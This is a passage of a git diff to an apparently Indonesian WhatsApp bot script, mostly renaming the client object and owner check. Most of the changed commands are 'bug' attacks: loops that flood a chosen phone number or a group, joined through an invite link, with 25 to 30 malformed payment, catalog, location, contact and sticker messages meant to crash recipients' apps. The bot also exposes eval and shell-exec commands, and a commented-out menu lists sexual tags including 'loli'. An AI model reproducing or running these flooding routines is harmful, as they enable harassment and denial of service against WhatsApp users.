           for (let i = 0; i < jumlah; i++) {
-            das.relayMessage(
+            kayla.relayMessage(
               num,
               {
                 requestPaymentMessage: {
@@ -5291,7 +4976,7 @@ ${meg.result}`);
         break;
       case 'vngas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5301,7 +4986,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(
+            kayla.sendMessage(
               num,
               {
                 audio: audionye,
@@ -5319,7 +5004,7 @@ ${meg.result}`);
         break;
       case 'kongas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5329,7 +5014,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendContact(num, owner, lep);
+            kayla.sendContact(num, owner, lep);
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`);
@@ -5337,7 +5022,7 @@ ${meg.result}`);
         break;
       case 'docgas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5347,7 +5032,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(
+            kayla.sendMessage(
               num,
               {
                 document: ppnyauser,
@@ -5366,7 +5051,7 @@ ${meg.result}`);
         break;
       case 'stickgas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5376,7 +5061,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(num, { sticker: ppnyauser }, { quoted: lep });
+            kayla.sendMessage(num, { sticker: ppnyauser }, { quoted: lep });
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`);
@@ -5384,7 +5069,7 @@ ${meg.result}`);
         break;
       case 'itemgas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5411,7 +5096,7 @@ ${meg.result}`);
         break;
       case 'cataloggas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5423,7 +5108,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: das.waUploadToServer }
+              { upload: kayla.waUploadToServer }
             );
             var catalog = generateWAMessageFromContent(
               num,
@@ -5440,14 +5125,14 @@ ${meg.result}`);
                     firstImageId: 1,
                     salePriceAmount1000: '1000',
                     retailerId: `Nomor Owner Di Atas`,
-                    url: `https://wa.me/6285768966412`,
+                    url: `https://wa.me/6285216024226`,
                   },
-                  businessOwnerJid: '6285768966412@s.whatsapp.net',
+                  businessOwnerJid: '6285216024226@s.whatsapp.net',
                 },
               }),
               { userJid: m.chat, quoted: lep }
             );
-            das.relayMessage(num, catalog.message, {
+            kayla.relayMessage(num, catalog.message, {
               messageId: catalog.key.id,
             });
             await sleep(1000);
@@ -5457,12 +5142,12 @@ ${meg.result}`);
         break;
       case 'kaylog':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: das.waUploadToServer }
+              { upload: kayla.waUploadToServer }
             );
             var catalog = generateWAMessageFromContent(
               m.chat,
@@ -5479,14 +5164,14 @@ ${meg.result}`);
                     firstImageId: 1,
                     salePriceAmount1000: '1000',
                     retailerId: `Nomor Owner Di Atas`,
-                    url: `https://wa.me/6285768966412`,
+                    url: `https://wa.me/6285216024226`,
                   },
-                  businessOwnerJid: '6285768966412@s.whatsapp.net',
+                  businessOwnerJid: '6285216024226@s.whatsapp.net',
                 },
               }),
               { userJid: m.chat, quoted: lep }
             );
-            das.relayMessage(m.chat, catalog.message, {
+            kayla.relayMessage(m.chat, catalog.message, {
               messageId: catalog.key.id,
             });
             await sleep(1000);
@@ -5496,12 +5181,12 @@ ${meg.result}`);
         break;
       case 'kayloc':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: das.waUploadToServer }
+              { upload: kayla.waUploadToServer }
             );
             var liveLocation = generateWAMessageFromContent(
               m.chat,
@@ -5519,7 +5204,7 @@ ${meg.result}`);
               }),
               { userJid: m.chat, quoted: lep }
             );
-            das.relayMessage(m.chat, liveLocation.message, {
+            kayla.relayMessage(m.chat, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
             await sleep(1000);
@@ -5529,10 +5214,10 @@ ${meg.result}`);
         break;
       case 'kaykontak':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendContact(m.chat, owner, lep);
+            kayla.sendContact(m.chat, owner, lep);
             await sleep(1000);
           }
           reply(`Sukses Send Bug Sebanyak ${jumlah}`);
@@ -5540,7 +5225,7 @@ ${meg.result}`);
         break;
       case 'kayitem':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
             sendBugcrash(
@@ -5560,20 +5245,20 @@ ${meg.result}`);
         break;
       case 'kaystick':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(m.chat, { sticker: ppnyauser }, { quoted: lep });
+            kayla.sendMessage(m.chat, { sticker: ppnyauser }, { quoted: lep });
           }
           reply(`Sukses Send Bug Sebanyak ${jumlah}`);
         }
         break;
       case 'kaydoc':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(
+            kayla.sendMessage(
               m.chat,
               {
                 document: ppnyauser,
@@ -5592,10 +5277,10 @@ ${meg.result}`);
         break;
       case 'kayvn':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(
+            kayla.sendMessage(
               m.chat,
               {
                 audio: audionye,
@@ -5613,10 +5298,10 @@ ${meg.result}`);
         break;
       case 'kayteks':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            das.relayMessage(
+            kayla.relayMessage(
               m.chat,
               {
                 requestPaymentMessage: {
@@ -5640,12 +5325,12 @@ ${meg.result}`);
         }
         break;
       case 'santedpcparah':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!q) return reply(`Contoh ${command} 6281297970769`);
         nmn = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         if (Input == creator)
           return reply('Tidak Bisa, Karena Itu Nomer Developer');
-        let hdhe = await das.onWhatsApp(nmn);
+        let hdhe = await kayla.onWhatsApp(nmn);
         if (hdhe.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -5653,28 +5338,28 @@ ${meg.result}`);
         santedpc(bygbt, nmn, sleep);
         break;
       case 'santedgcparah':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!q) return reply(`Contoh ${prefix + command} linkgc`);
         if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
           return reply('Link Invalid!');
         let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1];
-        let mnm = await das.groupAcceptInvite(fhehfhe);
+        let mnm = await kayla.groupAcceptInvite(fhehfhe);
         santedgc(bygbt, mnm, sleep);
         break;
       case 'santetpc':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!q) return reply(`Contoh ${command} 6281297970769`);
         tosend = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         if (Input == creator)
           return reply('Tidak Bisa, Karena Itu Nomer Developer');
-        let kgdhwus = await das.onWhatsApp(tosend);
+        let kgdhwus = await kayla.onWhatsApp(tosend);
         if (kgdhwus.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
           );
         jumlah = '30';
         for (let i = 0; i < jumlah; i++) {
-          das.sendMessage(tosend, {
+          kayla.sendMessage(tosend, {
             text: '',
             templateButtons: [
               { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5695,15 +5380,15 @@ ${meg.result}`);
         reply(`Sukses`);
         break;
       case 'santetgc':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!q) return reply(`Contoh ${prefix + command} linkgc`);
         if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
           return reply('Link Invalid!');
         let resultny = args[0].split('https://chat.whatsapp.com/')[1];
         jumlah = '30';
         for (let i = 0; i < jumlah; i++) {
-          let tosendgc = await das.groupAcceptInvite(resultny);
-          das.sendMessage(tosendgc, {
+          let tosendgc = await kayla.groupAcceptInvite(resultny);
+          kayla.sendMessage(tosendgc, {
             text: '',
             templateButtons: [
               { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5725,7 +5410,7 @@ ${meg.result}`);
         break;
       case 'spambugvip':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (args.length < 1)
             return reply(
               `Penggunaan ${prefix + command} nomor|jumlah\nContoh ${
@@ -5734,7 +5419,7 @@ ${meg.result}`);
             );
           numt = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
           jumlah = q.split('|')[1];
-          let cekno = await das.onWhatsApp(numt);
+          let cekno = await kayla.onWhatsApp(numt);
           if (cekno.length == 0)
             return reply(
               `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -5744,7 +5429,7 @@ ${meg.result}`);
             from,
             {
               groupInviteMessage: {
-                groupJid: '6285768966412@g.us',
+                groupJid: '6285216024226@g.us',
                 inviteCode: 'UkJdqTXupAtmDwo4',
                 inviteExpiration: '1643553084',
                 invitetime: '1643293887000',
@@ -5775,7 +5460,7 @@ ${meg.result}`);
           );
           var messa = await prepareWAMessageMedia(
             { image: ppnyauser },
-            { upload: das.waUploadToServer }
+            { upload: kayla.waUploadToServer }
           );
           var order = generateWAMessageFromContent(
             from,
@@ -5890,10 +5575,10 @@ ${meg.result}`);
             { userJid: from, quoted: lep }
           );
           for (let i = 0; i < jumlah; i++) {
-            das.relayMessage(numt, buginvite.message, {
+            kayla.relayMessage(numt, buginvite.message, {
               messageId: buginvite.key.id,
             });
-            das.relayMessage(
+            kayla.relayMessage(
               numt,
               {
                 requestPaymentMessage: {
@@ -5911,35 +5596,35 @@ ${meg.result}`);
               },
               {}
             );
-            das.relayMessage(numt, pollCreation.message, {
+            kayla.relayMessage(numt, pollCreation.message, {
               messageId: pollCreation.key.id,
             });
-            das.relayMessage(numt, order.message, {
+            kayla.relayMessage(numt, order.message, {
               messageId: order.key.id,
             });
-            das.relayMessage(numt, audio.message, {
+            kayla.relayMessage(numt, audio.message, {
               messageId: audio.key.id,
             });
-            das.relayMessage(numt, image.message, {
+            kayla.relayMessage(numt, image.message, {
               messageId: image.key.id,
             });
-            das.relayMessage(numt, document.message, {
+            kayla.relayMessage(numt, document.message, {
               messageId: document.key.id,
             });
-            das.relayMessage(numt, liveLocation.message, {
+            kayla.relayMessage(numt, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
-            das.relayMessage(numt, sticker.message, {
+            kayla.relayMessage(numt, sticker.message, {
               messageId: sticker.key.id,
             });
-            das.sendKatalog(
+            kayla.sendKatalog(
               numt,
               `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
               `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
               ppnyauser,
               { quoted: lep }
             );
-            das.sendMessage(numt, {
+            kayla.sendMessage(numt, {
               text: '',
               templateButtons: [
                 { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5960,15 +5645,15 @@ ${meg.result}`);
         break;
       case 'sendbug':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q) return reply(`Contoh ${prefix + command} linkgc`);
           if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
             return reply('Link Invalid!');
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await das.groupAcceptInvite(result);
-            das.relayMessage(
+            let kir = await kayla.groupAcceptInvite(result);
+            kayla.relayMessage(
               kir,
               {
                 requestPaymentMessage: {
@@ -5993,15 +5678,15 @@ ${meg.result}`);
         break;
       case 'senddoc':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q) return reply(`Contoh ${prefix + command} linkgc`);
           if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
             return reply('Link Invalid!');
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await das.groupAcceptInvite(result);
-            das.sendMessage(
+            let kir = await kayla.groupAcceptInvite(result);
+            kayla.sendMessage(
               kir,
               {
                 document: ppnyauser,
@@ -6019,17 +5704,17 @@ ${meg.result}`);
         break;
       case 'sendloc':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q) return reply(`Contoh ${prefix + command} linkgc`);
           if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
             return reply('Link Invalid!');
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await das.groupAcceptInvite(result);
+            let kir = await kayla.groupAcceptInvite(result);
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: das.waUploadToServer }
+              { upload: kayla.waUploadToServer }
             );
             var location = generateWAMessageFromContent(
               kir,
@@ -6044,7 +5729,7 @@ ${meg.result}`);
               }),
               { userJid: from, quoted: lep }
             );
-            das.relayMessage(kir, location.message, {
+            kayla.relayMessage(kir, location.message, {
               messageId: location.key.id,
             });
             await sleep(1000);
@@ -6267,7 +5952,7 @@ ${meg.result}`);
           if (/leaves/.test(command))
             link = 'https://textpro.me/natural-leaves-text-effect-931.html';
           let anu = await textpro.textpro(link, q);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { image: { url: anu }, caption: `${mess.succes}` },
             { quoted: m }
@@ -6397,7 +6082,7 @@ ${meg.result}`);
             link =
               'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html';
           let haldwhd = await ephoto(link, q);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { image: { url: haldwhd }, caption: `${mess.succes}` },
             { quoted: m }
@@ -6517,7 +6202,7 @@ ${meg.result}`);
             link =
               'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
           let dehe = await photooxy.photoOxy(link, q);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { image: { url: dehe }, caption: `${mess.succes}` },
             { quoted: m }
@@ -6525,10 +6210,12 @@ ${meg.result}`);
         }
         break;
 
+      /*
       case 'aesthetic':
       case 'ahegao':
       case 'akira':
       case 'akiyama':
+      case 'ana':
       case 'anjing':
       case 'art':
       case 'ass':
@@ -6540,6 +6227,7 @@ ${meg.result}`);
       case 'bts':
       case 'cecan':
       case 'chiho':
+      case 'chitoge':
       case 'cogan':
       case 'cosplay':
       case 'cosplayloli':
@@ -6553,17 +6241,24 @@ ${meg.result}`);
       case 'eba':
       case 'elaina':
       case 'emilia':
+      case 'ero':
       case 'erza':
       case 'exo':
+      case 'femdom':
       case 'foot':
       case 'freefire':
       case 'gamewallpaper':
+      case 'gangbang':
       case 'gifs':
       case 'glasses':
       case 'gremory':
       case 'hekel':
+      case 'hentai':
       case 'hestia':
       case 'hijaber':
+      case 'hinata':
+      case 'husbu':
+      case 'inori':
       case 'islamic':
       case 'isuzu':
       case 'itachi':
@@ -6584,6 +6279,7 @@ ${meg.result}`);
       case 'kucing':
       case 'kurumi':
       case 'lisa':
+      case 'loli':
       case 'madara':
       case 'masturbation':
       case 'megumin':
@@ -6596,6 +6292,9 @@ ${meg.result}`);
       case 'motor':
       case 'mountain':
       case 'naruto':
+      case 'neko':
+      case 'neko2':
+      case 'nekonime':
       case 'nezuko':
       case 'onepiece':
       case 'orgy':
@@ -6626,6 +6325,9 @@ ${meg.result}`);
       case 'tejina':
       case 'tentacles':
       case 'thighs':
+      case 'toukachan':
+      case 'tsunade':
+      case 'waifu':
       case 'wallhp':
       case 'wallml':
       case 'wallnime':
@@ -7151,12 +6853,23 @@ ${meg.result}`);
             headerType: 4,
             contextInfo: {
               mentionedJid: [sender],
+              externalAdReply: {
+                showAdAttribution: true,
+                renderLargerThumbnail: true,
+                title: `Hai Kak ${pushname}`,
+                containsAutoReply: true,
+                mediaType: 1,
+                thumbnail: { url: yeha },
+                mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+                sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              },
             },
           };
-          das.sendMessage(m.chat, buttonMessaage, { quoted: m });
+          kayla.sendMessage(m.chat, buttonMessaage, { quoted: m });
         }
         break;
 
+        */
       case 'fox':
       case 'dog':
       case 'cat':
@@ -7166,7 +6879,7 @@ ${meg.result}`);
         if (!isPrem) return replyprem(mess.premium);
         neys = await fetchJson(`https://some-random-api.ml/img/${command}`);
         anu1 = await getBuffer(neys.link);
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           { image: anu1, caption: `${mess.succes}` },
           { quoted: m }
@@ -7179,7 +6892,7 @@ ${meg.result}`);
             'https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json'
           );
           let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             { video: { url: hayu }, caption: `${mess.succes}` },
             { quoted: m }
@@ -7620,7 +7333,7 @@ ${meg.result}`);
         break;
       case '>':
       case '=>':
-        if (!isOwner) return;
+        if (!itsMeKayla) return;
         var err = new TypeError();
         err.name = 'EvalError ';
         err.message = 'Code Not Found (404)';
@@ -7643,35 +7356,28 @@ ${meg.result}`);
         break;
       default:
         if (budy.startsWith('<')) {
-          if (!isOwner) return;
+          if (!itsMeKayla) return;
           try {
-            // return reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'));
-            return reply(
-              JSON.stringify(
-                eval(`(async()=>{ ${args.join(' ')} })()`),
-                null,
-                '\t'
-              )
-            );
+            return reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'));
           } catch (e) {
-            reply(String(e));
+            reply(JSON.stringify(e));
           }
         }
 
-        if (budy.startsWith('>')) {
-          if (!isOwner) return;
+        if (budy.startsWith('vv')) {
+          if (!itsMeKayla) return;
           try {
             let evaled = await eval(budy.slice(2));
             if (typeof evaled !== 'string')
               evaled = require('util').inspect(evaled);
-            reply(evaled);
+            await reply(evaled);
           } catch (err) {
             reply(String(err));
           }
         }
 
         if (budy.toLowerCase().startsWith('term')) {
-          if (!isOwner) return;
+          if (!itsMeKayla) return;
           qur = budy.slice(5);
           exec(qur, (err, stdout) => {
             if (err) return reply(`${err}`);
@@ -7709,18 +7415,16 @@ ${meg.result}`);
           if (m.isBaileys) return;
           let msgs = global.db.database;
           if (!(budy.toLowerCase() in msgs)) return;
-          das.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
+          kayla.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
         }
     }
   } catch (err) {
-    console.log(typeof util.format(err));
     console.log(util.format(err));
     let e = JSON.stringify(err);
-    console.log(typeof e);
-    das.sendMessage(
+    kayla.sendMessage(
       ownerNumber,
       {
-        text: util.format(err),
+        text: e,
 
         contextInfo: {
           forwardingScore: 5,
